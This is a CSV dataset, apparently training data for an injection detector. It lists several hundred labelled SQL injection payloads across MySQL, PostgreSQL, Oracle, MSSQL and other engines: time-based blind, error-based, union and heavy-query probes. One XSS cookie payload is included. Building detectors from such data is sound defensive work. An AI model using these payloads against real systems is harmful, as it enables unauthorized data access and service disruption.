payload,attack_type,label
"1')) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (('stqq'='stqq",sqli,1
1')) as gchn where 5856=5856;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,sqli,1
1' and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and 'toxr' like 'toxr,sqli,1
"-1964') as ihsp where 6379=6379 or elt(6945=6165,6165)--",sqli,1
"1""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""jgoq""=""jgoq",sqli,1
"1"" procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ""onsd"" like ""onsd",sqli,1
"-7676"")) as flov where 7967=7967 union all select 7967--",sqli,1
1;begin user_lock.sleep(5); end# ckxq,sqli,1
"1%';select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1
1') and (select * from (select(sleep(5)))fzno) and ('mqoj' like 'mqoj,sqli,1
"1) and make_set(4593=7765,7765) and (8517=8517",sqli,1
"1')) and elt(1210=1210,sleep(5)) and (('zizo' like 'zizo",sqli,1
"1"") and make_set(8403=8403,8899) and (""dhss""=""dhss",sqli,1
"-6412)) as cnfs where 6557=6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",sqli,1
"1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual",sqli,1
"1',(select (case when (4209=5879) then 1 else 4209*(select 4209 from information_schema.character_sets) end))",sqli,1
"1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)-- dtha",sqli,1
"1"";select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1"")) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((""bfko""=""bfko",sqli,1
"1 where 2060=2060;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"-7126')) as fzpp where 8078=8078 union all select 8078,8078,8078,8078,8078,8078,8078#",sqli,1
-2504'))) or 8723=9715,sqli,1
"1) as nfgb where 2503=2503 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1
"1)) or elt(6272=6272,sleep(5)) and ((8024=8024",sqli,1
"-2125"")) or 8571=8571--",sqli,1
">""<img src=""mocha:document.cookie=true;"">",xss,1
"1%' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""xwnw""=""xwnw",sqli,1
1'+(select ukwc where 3008=3008 or (select * from (select(sleep(5)))sddo)#,sqli,1
"1"")) and (7467=7962)*7962 and ((""nhld""=""nhld",sqli,1
"1 where 1656=1656 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1%"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""%""=""",sqli,1
1%'))) and 7219=7361 and ((('%'=',sqli,1
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""wvyb""=""wvyb",sqli,1
1) where 3565=3565 and 6969=(select 6969 from pg_sleep(5))--,sqli,1
1')) and 6969=(select 6969 from pg_sleep(5)) and (('gjja'='gjja,sqli,1
-6310 or 6715=3399,sqli,1
1')));select pg_sleep(5) and ((('mgbm' like 'mgbm,sqli,1
"1'||(select 'kzkr' from dual where 2778=2778;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)||'",sqli,1
1')));begin dbms_lock.sleep(5); end and ((('nhub'='nhub,sqli,1
"1%')) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('%'='",sqli,1
"1) as ilqx where 8547=8547;select count(*) from generate_series(1,5000000)--",sqli,1
"1"") and 4760=2922",sqli,1
1) or 6793=(select 6793 from pg_sleep(5)),sqli,1
"1"" where 9632=9632 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1
"1 where 7522=7522 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1
"1 where 6965=6965 and elt(3933=1232,1232)--",sqli,1
"1"";select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--",sqli,1
"1,(select (case when (5141=5141) then (ascii(regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))) else 5141/(select 0 from (values(0))) end) from (values(0)))",sqli,1
"1%') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('%'='",sqli,1
1)) as dhqt where 8485=8485 waitfor delay '0:0:5'--,sqli,1
1%'))) waitfor delay '0:0:5' and ((('%'=',sqli,1
"1') as bagi where 1281=1281 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",sqli,1
1' and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and 'ucpa'='ucpa,sqli,1
"1%"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1
"1'))) and make_set(8403=8403,8899) and ((('llfp'='llfp",sqli,1
"1"") and elt(3114=3114,sleep(5))#",sqli,1
"1"") as jask where 7629=7629 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1
"1' in boolean mode) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))#",sqli,1
"1 where 1186=1186 union all select null,null,null,null,null,null,null#",sqli,1
"1' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
-7209'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('stqx'='stqx,sqli,1
1' waitfor delay '0:0:5'--,sqli,1
"1"" where 3221=3221 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",sqli,1
"1"") as obbk where 6414=6414 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1
"-8888%') union all select 5312,5312,5312,5312,5312,5312,5312,5312--",sqli,1
"1' and elt(1210=1210,sleep(5)) and 'yhpp' like 'yhpp",sqli,1
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1
"1"" and (1668=8054)*8054",sqli,1
1') rlike (select * from (select(sleep(5)))sgvo) and ('zqiw'='zqiw,sqli,1
"-3856"") as iyzl where 7394=7394 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1
"1"") where 3393=3393 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"-6803"") order by 1#",sqli,1
"1%"" or 8156=(select count(*) from generate_series(1,5000000))--",sqli,1
"-7689' union all select 8739,8739,8739,8739,8739,8739,8739,8739,8739,8739--",sqli,1
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('esma' like 'esma",sqli,1
1') and 4822=6997 and ('ojku'='ojku,sqli,1
1';select (case when (1743=5698) then 1743 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
"1')) and make_set(8403=8403,8899) and (('lokx' like 'lokx",sqli,1
1' where 8231=8231;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
"1%""))) rlike (select * from (select(sleep(5)))sgvo) and (((""%""=""",sqli,1
1))) and (3020=3020)*6703 and (((1233=1233,sqli,1
"1'+(select rqcw where 9002=9002 union all select null,null,null,null,null,null,null,null,null#",sqli,1
"-4822"" or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ""owbp""=""owbp",sqli,1
1) as eryo where 2531=2531 rlike sleep(5)--,sqli,1
1'+(select 'qbdh' where 4006=4006 and 7533=7533)+',sqli,1
-6712')) as kqff where 9146=9146 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1
"-3505"") where 2340=2340 or 9323=9323#",sqli,1
"1""));select sleep(5) and ((""twed"" like ""twed",sqli,1
"-9046')) as ymqc where 3733=3733 union all select 3733,3733,3733,3733,3733,3733,3733--",sqli,1
"1') union all select null,null--",sqli,1
-3748' where 9292=9292 or 3337=2859#,sqli,1
1';begin dbms_lock.sleep(5); end,sqli,1
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",sqli,1
"1'))) union all select null,null--",sqli,1
"1%"") and make_set(9956=1060,1060) and (""%""=""",sqli,1
"-1123'))) union all select 6735,6735,6735,6735,6735,6735,6735,6735#",sqli,1
1')));select (case when (6166=3364) then 6166 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
"1"")) as sdlv where 5922=5922 and 2006=2006",sqli,1
"1') as dwgv where 1525=1525 union all select null,null--",sqli,1
1') where 1502=1502 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,sqli,1
1' rlike (select * from (select(sleep(5)))sgvo),sqli,1
"(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)",sqli,1
1' where 5035=5035 and 8594=(select 8594 from pg_sleep(5))--,sqli,1
"1) as ekgx where 9923=9923 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1) where 7588=7588 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1
"1%') and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"1%"")) or 4240=(select 4240 from pg_sleep(5))--",sqli,1
-9711'+(select 'ckpj' where 8338=8338 union all select 8338--,sqli,1
"1"" where 2072=2072 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"1"" and 8407=(select count(*) from generate_series(1,5000000))",sqli,1
"1"")) and make_set(8403=8403,8899) and ((""nsyl""=""nsyl",sqli,1
"1"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""gzhp""=""gzhp",sqli,1
"1) as phja where 4627=4627;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1
"1))) or elt(5873=5873,sleep(5))#",sqli,1
"1""))) and 4967=8866 and (((""jzyn"" like ""jzyn",sqli,1
"1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((7700=7700",sqli,1
1'||(select 'aioq' from dual where 8176=8176;begin user_lock.sleep(5); end--,sqli,1
-2374) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (2576=2576,sqli,1
-2165' where 6593=6593 or 9158=7254--,sqli,1
1') as gogu where 4338=4338 union all select null#,sqli,1
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('vpus'='vpus",sqli,1
"1"" where 1765=1765 union all select null,null,null,null,null,null#",sqli,1
"1'))) and make_set(8403=8403,8899) and ((('oacz'='oacz",sqli,1
-9553)) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((5299=5299,sqli,1
"1' and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli,1
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)",sqli,1
"-9698) as pvhn where 3223=3223 or elt(6563=9210,9210)--",sqli,1
1'+(select 'tmel' where 2655=2655 rlike (select (case when (2118=8500) then 1 else 0x28 end)))+',sqli,1
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""acbq"" like ""acbq",sqli,1
"1'+(select 'mxlb' where 4900=4900;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1
"1"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""lxue"" like ""lxue",sqli,1
"-2207%')) union all select 3339,3339,3339,3339,3339,3339#",sqli,1
"1"" union all select null,null,null,null,null,null--",sqli,1
"1"") and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""cmhh"" like ""cmhh",sqli,1
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""pawh""=""pawh",sqli,1
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- viti",sqli,1
"1') as khaa where 8157=8157 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"1) as rnfb where 2405=2405 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
"1%"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""",sqli,1
"1"")) union all select null,null,null,null,null,null,null,null,null,null--",sqli,1
"1) where 5048=5048 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('tzrd'='tzrd",sqli,1
"1%"" and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
"1"" where 2204=2204 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1
-6764') or 2314=2017--,sqli,1
1 rlike sleep(5)#,sqli,1
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('btnl'='btnl",sqli,1
-3100') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('etuj' like 'etuj,sqli,1
"1'+(select 'bztp' where 2541=2541 union all select null,null,null,null,null,null,null,null,null,null--",sqli,1
-9556') where 2472=2472 or (2883=9968)*9968--,sqli,1
1';select (case when (1014=4280) then 1014 else 1014*(select 1014 from mysql.db) end)#,sqli,1
1' in boolean mode) or 4240=(select 4240 from pg_sleep(5))--,sqli,1
1) and 6969=(select 6969 from pg_sleep(5)) and (9505=9505,sqli,1
"-1263"") or 9323=9323#",sqli,1
"1"") where 9248=9248;if(6767=5022) select 6767 else drop function buii--",sqli,1
"1%"")) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"-3031"" union all select 2681#",sqli,1
"1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1
"-6377'||(select 'ryin' where 2113=2113 union all select 2113,2113,2113#",sqli,1
"1"") where 2473=2473 and make_set(6118=7684,7684)--",sqli,1
"1 where 3902=3902 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
1'+(select 'kicv' where 1976=1976 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))+',sqli,1
-8410'))) or 8571=8571--,sqli,1
1') where 6842=6842;begin dbms_lock.sleep(5); end--,sqli,1
1' in boolean mode);select pg_sleep(5)--,sqli,1
1)));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1
"-5066')) union all select 9689,9689,9689,9689#",sqli,1
1));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1
"1"") where 2873=2873 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1
"1""));begin dbms_lock.sleep(5); end and ((""dmgj""=""dmgj",sqli,1
"1"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""mofa"" like ""mofa",sqli,1
"1%"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""",sqli,1
"1');select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))",sqli,1
"-6948"")) as ojjl where 1300=1300 or 6872=6872--",sqli,1
-6397%' or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and '%'=',sqli,1
"1'+(select 'drqj' where 1246=1246;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1
"1') where 6941=6941 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",sqli,1
-3462')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('cxku' like 'cxku,sqli,1
"1' in boolean mode) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#",sqli,1
"-5763'))) union all select 1640,1640,1640,1640,1640,1640,1640,1640,1640,1640#",sqli,1
1));begin user_lock.sleep(5); end--,sqli,1
1'+(select 'yyyn' where 5395=5395;select (case when (8663=7467) then 8663 else 1/(select 0) end)--,sqli,1
1 where 8393=8393;select (case when (9299=2760) then 1 else 9299*(select 9299 from master..sysdatabases) end)--,sqli,1
-3458') where 2053=2053 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1
"-5217'||(select 'juen' from dual where 7336=7336 union all select 7336,7336,7336--",sqli,1
"1%""))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((""%""=""",sqli,1
"1 where 6434=6434;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1
"1' union all select null,null,null,null,null#",sqli,1
"1') where 6387=6387 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1"") where 1024=1024 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"1) and 3824=benchmark(5000000,md5(0x76555642))",sqli,1
"1,(select (case when (6857=7623) then 1 else 6857*(select 6857 from information_schema.character_sets) end))",sqli,1
"1"") where 5828=5828 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1%"") and 8407=(select count(*) from generate_series(1,5000000)) and (""%""=""",sqli,1
"-2715')) union all select 8646,8646,8646,8646,8646,8646,8646,8646--",sqli,1
"-9178 where 2253=2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#",sqli,1
-8809'||(select 'hyzr' where 5694=5694 union all select 5694--,sqli,1
"1"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""wdye"" like ""wdye",sqli,1
"1"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1
"1"") where 6367=6367 union all select null,null,null,null,null,null,null#",sqli,1
"1'||(select 'qrle' from dual where 9239=9239 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)))||'",sqli,1
1%'));waitfor delay '0:0:5' and (('%'=',sqli,1
"1'+(select 'yfrs' where 4388=4388 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1
1' rlike (select (case when (5567=5586) then 1 else 0x28 end)) and 'mmnb'='mmnb,sqli,1
"1%"" and sleep(5)#",sqli,1
"1"") and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (""wfwg"" like ""wfwg",sqli,1
"1%"" and 5411=7697 and ""%""=""",sqli,1
"1'||(select 'bvic' from dual where 4839=4839 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'",sqli,1
"1') as nvqk where 3917=3917 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)",sqli,1
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1
"-8707') union all select 5609,5609,5609--",sqli,1
-7971' union all select 4273#,sqli,1
"1) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)",sqli,1
"1'))) and 3824=benchmark(5000000,md5(0x76555642)) and ((('wesl'='wesl",sqli,1
"1"" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",sqli,1
-9509') where 9303=9303 order by 1#,sqli,1
"1"")));waitfor delay '0:0:5' and (((""mfro"" like ""mfro",sqli,1
"-8793' where 3853=3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",sqli,1
"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",sqli,1
"1%"" union all select null,null,null#",sqli,1
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1
"-7171%')) union all select 5580,5580,5580,5580,5580,5580,5580,5580--",sqli,1
"-9152"")) as avga where 3825=3825 order by 1#",sqli,1
"1'||(select 'pygt' from dual where 5543=5543 union all select null,null,null,null,null,null#",sqli,1
"1')) as xrre where 1172=1172 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)--",sqli,1
"1'+(select 'zgtu' where 8419=8419;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1
"1'+(select uzan where 4312=4312 and make_set(3129=9555,9555))+'",sqli,1
"1""))) union all select null,null,null,null,null,null#",sqli,1
-6215') or (8459=8459)*4906,sqli,1
"1"")) union all select null,null,null,null,null,null,null,null,null#",sqli,1
"1) as vzyk where 5103=5103 and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1
"-3862)) as vqtl where 9629=9629 union all select 9629,9629,9629,9629,9629--",sqli,1
-5500') order by 1--,sqli,1
"-3975') or make_set(1943=3499,3499) and ('dawb'='dawb",sqli,1
1') as ncou where 9166=9166 and (select * from (select(sleep(5)))fzno)--,sqli,1
"1"" rlike (select (case when (7689=7689) then 1 else 0x28 end))",sqli,1
"1))) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1
"1%"" union all select null,null,null,null--",sqli,1
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'iuao'='iuao,sqli,1
"-7637"" union all select 8498,8498,8498--",sqli,1
"1) as mnyy where 4409=4409 union all select null,null,null,null--",sqli,1
"1' union all select null,null,null,null,null,null#",sqli,1
"1)) as henn where 9980=9980 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1
"-7350'))) union all select 9207,9207,9207,9207--",sqli,1
"1' where 4701=4701 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",sqli,1
"1)) as wezj where 2869=2869 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1
"1""))) or (select * from (select(sleep(5)))ydpu) and (((""djwo""=""djwo",sqli,1
"1')) as bwjl where 8538=8538 union all select null,null,null,null,null,null,null#",sqli,1
"1'||(select 'xbwg' where 7518=7518 union all select null,null,null,null,null,null--",sqli,1
1'+(select 'hjku' where 1954=1954 and (select * from (select(sleep(5)))fzno))+',sqli,1
"1"") and make_set(8403=8403,8899) and (""akha"" like ""akha",sqli,1
-9809' order by 1--,sqli,1
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1' in boolean mode);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#,sqli,1
"1) or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)",sqli,1
